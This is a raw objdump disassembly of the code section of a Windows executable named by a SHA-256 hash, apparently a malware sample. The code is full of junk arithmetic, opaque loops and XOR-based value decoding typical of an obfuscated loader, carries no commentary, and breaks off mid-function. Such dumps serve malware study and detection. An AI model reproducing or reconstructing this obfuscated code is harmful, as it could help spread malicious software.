
d1c45f3a4bafca16ea8d1b07f28f38cc2fc63a3850ce3a4ddfdc6ac87d726541.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
